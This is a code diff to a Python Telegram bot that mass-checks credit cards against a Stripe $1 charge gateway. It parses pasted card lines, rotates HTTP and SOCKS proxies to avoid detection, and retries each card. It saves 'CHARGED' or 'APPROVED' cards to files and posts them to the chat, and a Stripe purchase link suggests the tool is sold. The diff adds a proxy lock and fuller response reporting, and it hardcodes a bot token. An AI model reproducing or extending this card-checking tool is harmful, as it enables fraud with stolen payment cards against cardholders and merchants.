@@ -1,4 +1,5 @@
 import requests
+import sys
 import os
 import time
 import concurrent.futures
@@ -10,11 +11,10 @@ import string
 import urllib.parse
 from telebot import TeleBot, types
 from functools import partial
+if sys.platform == 'win32':
+    os.system('chcp 65001 > nul')
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-if not BOT_TOKEN:
-    BOT_TOKEN = "8675963323:AAFdOHR_-qhX_TPTOOESKOWWbg6ToEhIm50"
-
+BOT_TOKEN = os.getenv("BOT_TOKEN") if os.getenv("BOT_TOKEN") else "8675963323:AAFdOHR_-qhX_TPTOOESKOWWbg6ToEhIm50"
 bot = TeleBot(BOT_TOKEN)
 
 BUY_URL = "https://buy.stripe.com/28o2apdMBcTa69G3cf"
@@ -286,6 +286,24 @@ def check_cc(cc_full, proxy=None, proxy_type="http"):
     except Exception as e:
         return "ERROR", f"Gateway Error: {str(e)[:150]}", "UNKNOWN"
 
+def build_block(cc_line, status, response, brand, bank, country, flag):
+    emoji = STATUS_EMOJI.get(status, "")
+    return f"""────────────────────────────────────────
+{CARD_ICON} {cc_line}
+{GATE_ICON} Stripe $1
+{STATUS_ICON} {status} {emoji}
+{RESP_ICON} {response}
+{BRAND_ICON} {brand}
+{BANK_ICON} {bank}
+{COUNTRY_ICON} {country} {flag}
+{DEV_ICON} Haste
+────────────────────────────────────────"""
+
+def save_result(block, status):
+    if status in ["CHARGED", "APPROVED"]:
+        with open(f"{status.lower()}.txt", "a", encoding="utf-8") as f:
+            f.write(block + "\n\n")
+
 def save_approved_list(cc_line):
     try:
         parts = cc_line.strip().split('|')
@@ -310,24 +328,6 @@ def build_final_approved_file():
         pass
     return 0
 
-def build_block(cc_line, status, response, brand, bank, country, flag):
-    emoji = STATUS_EMOJI.get(status, "")
-    return f"""────────────────────────────────────────
-{CARD_ICON} {cc_line}
-{GATE_ICON} Stripe $1
-{STATUS_ICON} {status} {emoji}
-{RESP_ICON} {response}
-{BRAND_ICON} {brand}
-{BANK_ICON} {bank}
-{COUNTRY_ICON} {country} {flag}
-{DEV_ICON} Haste
-────────────────────────────────────────"""
-
-def save_result(block, status):
-    if status in ["CHARGED", "APPROVED"]:
-        with open(f"{status.lower()}.txt", "a", encoding="utf-8") as f:
-            f.write(block + "\n\n")
-
 def clean_declined_files():
     for f in ["declined.txt", "error.txt"]:
         if os.path.exists(f):
@@ -340,7 +340,10 @@ def worker(cc_line, use_proxy=False, proxy_type="http", chat_id=None):
     attempt = 0
     while attempt < 3:
         attempt += 1
-        proxy = random.choice(proxies_list) if use_proxy and proxies_list else None
+        proxy = None
+        if use_proxy and proxies_list:
+            with proxy_lock:
+                proxy = random.choice(proxies_list)
         status, response, brand_auto = check_cc(cc_line, proxy, proxy_type)
         if status in ["CHARGED", "APPROVED", "DECLINED"]:
             break
@@ -355,7 +358,7 @@ def worker(cc_line, use_proxy=False, proxy_type="http", chat_id=None):
     block = build_block(cc_line, status, response, brand, bank, country, flag)
     if chat_id:
         try:
-            bot.send_message(chat_id, f"`{cc_line}` → **{status}** {STATUS_EMOJI.get(status, '')}", parse_mode='Markdown')
+            bot.send_message(chat_id, f"`{cc_line}` → **{status}** {STATUS_EMOJI.get(status, '')} (Try {attempt})\n{response}", parse_mode='Markdown')
             if status in ["CHARGED", "APPROVED"]:
                 bot.send_message(chat_id, f"```{block}```", parse_mode='Markdown')
         except:
@@ -415,11 +418,12 @@ def single_check(msg):
 
 def mass_check_paste(msg):
     lines = [line.strip() for line in msg.text.splitlines() if line.strip() and '|' in line]
-    if not lines:
+    ccs = lines
+    if not ccs:
         bot.send_message(msg.chat.id, "Walay valid nga cards.")
         return
-    bot.send_message(msg.chat.id, f"Nakarga {len(lines)} ka cards.\n1 HTTP\n2 HTTPS\n3 SOCKS4\n4 SOCKS5\n5 PROXYLESS\n6 AUTO GOOD-PROXIES (VERY VERY FAST)")
-    bot.register_next_step_handler(msg, lambda m: mass_proxy_choice(m, lines))
+    bot.send_message(msg.chat.id, f"Nakarga {len(ccs)} ka cards.\n1 HTTP\n2 HTTPS\n3 SOCKS4\n4 SOCKS5\n5 PROXYLESS\n6 AUTO GOOD-PROXIES (VERY VERY FAST)")
+    bot.register_next_step_handler(msg, lambda m: mass_proxy_choice(m, ccs))
 
 def mass_proxy_choice(msg, ccs):
     ch = msg.text.strip()
